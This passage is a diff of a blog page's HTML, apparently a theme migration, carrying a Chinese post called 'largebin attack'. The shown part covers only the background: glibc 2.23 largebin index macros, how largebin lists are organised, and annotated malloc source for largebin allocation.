@@ -1,452 +1,207 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>largebin attack - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="largebin的一些学习记录 基础知识largebin在源码中的定义：（版本2.23）4 12345678910111213141516171819202122232425262728293031#define largebin_index_32(sz)                                                \  (((((unsigned long) (">
-<meta name="keywords" content="pwn,largebin">
-<meta property="og:type" content="article">
-<meta property="og:title" content="largebin attack">
-<meta property="og:url" content="http://yoursite.com/2019/04/16/2019-4-16-largebin-attack/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="largebin的一些学习记录 基础知识largebin在源码中的定义：（版本2.23）4 12345678910111213141516171819202122232425262728293031#define largebin_index_32(sz)                                                \  (((((unsigned long) (">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1555415505300.png">
-<meta property="og:updated_time" content="2019-04-19T08:57:37.685Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="largebin attack">
-<meta name="twitter:description" content="largebin的一些学习记录 基础知识largebin在源码中的定义：（版本2.23）4 12345678910111213141516171819202122232425262728293031#define largebin_index_32(sz)                                                \  (((((unsigned long) (">
-<meta name="twitter:image" content="http://yoursite.com/picture/1555415505300.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2019/04/16/2019-4-16-largebin-attack/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>largebin attack | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/16/2019-4-16-largebin-attack/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">largebin attack
-
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+            </span>
 
             
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
               
-                <span class="post-meta-item-text">发表于</span>
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Tuesday, April 16th 2019, 3:10 pm
+                </p>
               
 
-              
+              <p class="mt-1">
                 
-              
-
-              <time title="创建时间：2019-04-16 15:10:05" itemprop="dateCreated datePublished" datetime="2019-04-16T15:10:05+08:00">2019-04-16</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.5k 字
+                  </span>
                 
 
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
                 
-                  <span class="post-meta-item-text">更新于</span>
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      12 分钟
+                  </span>
                 
-                <time title="修改时间：2019-04-19 16:57:37" itemprop="dateModified" datetime="2019-04-19T16:57:37+08:00">2019-04-19</time>
-              
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          </span>
+          </div>
 
           
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>largebin的一些学习记录</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>largebin的一些学习记录</p>
 <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>largebin在源码中的定义：（版本2.23）4</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#define largebin_index_32(sz)                                                \
+  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\
+   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
+   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
+   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
+   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
+   126)
+
+#define largebin_index_32_big(sz)                                            \
+  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;&gt; 6) :\
+   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
+   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
+   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
+   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
+   126)
+
+// XXX It remains to be seen whether it is good to keep the widths of
+// XXX the buckets the same or whether it should be scaled by a factor
+// XXX of two as well.
+#define largebin_index_64(sz)                                                \
+  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\
+   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
+   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
+   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
+   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
+   126)
+
+#define largebin_index(sz) \
+  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \
+   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \
+   : largebin_index_32 (sz))
+</code></pre>
 <p>在largebins中一共包括63个bin，每个bin中的chunk大小不一致，处在一定的区间范围内。并且这63个bin 被分成了6组，每组的bin中的chunk的大小之间的公差一致。</p>
 <table>
 <thead>
@@ -492,594 +247,678 @@
 <p>每个largebins维护着两个链表，一个是横向的双向链表，它们的chunk size不相同，另一个是纵向的双向链表，它们的chunk size 相同。横向的通过fd_nextsize和bk_nextsize两个指针连接，纵向的通过fd和bk两个指针连接。</p>
 <p>在largebin中，chunk按照由大到小的顺序排列。请求一个largebin范围的chunk时，会在对应的bin中从小到大进行扫描，找到第一个合适的。释放一个largebin大小的chunk，首先会根据chunk size的大小，按照bk_nextsize的顺序来选择合适的地方插入，如果碰到相同的chunksize的纵向列表，就会将这个chunk插入到纵向列表，这样就不会进行额外的fd_nextsize和bk_nextsize指针的赋值，否则就会将这个chunk作为独立的纵向列表表头，插入到largebin 中。</p>
 <p>请求largebin大小的源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 反向遍历链表，找到第一个比size大的chunk</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line">			</span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="comment">//如果取出的chunk不是bin的最后一个chunk，同时该chunk的纵向列表不为空</span></span><br><span class="line">              <span class="comment">//它就会取它前面的那个chunk</span></span><br><span class="line">              <span class="comment">//因为大小相同的chunk只有一个会被串在nextsize链上</span></span><br><span class="line">              <span class="comment">//这可以避免额外的bk_nextsize和fd_nextsize的赋值</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line">			  <span class="comment">//计算切割后的大小</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);<span class="comment">//通过unlink将chunk从链表移除</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">//如果切割后的大小不足以作为一个chunk，那么就会将其标志位设为inuse</span></span><br><span class="line">                  <span class="comment">//同时设置NO_main_arena标志位</span></span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">//如果剩余的大小可以作为一个chunk</span></span><br><span class="line">                  <span class="comment">//获得剩余部分的地址，放入unsorted bin中</span></span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">if (!in_smallbin_range (nb))
+        {
+          bin = bin_at (av, idx);
+
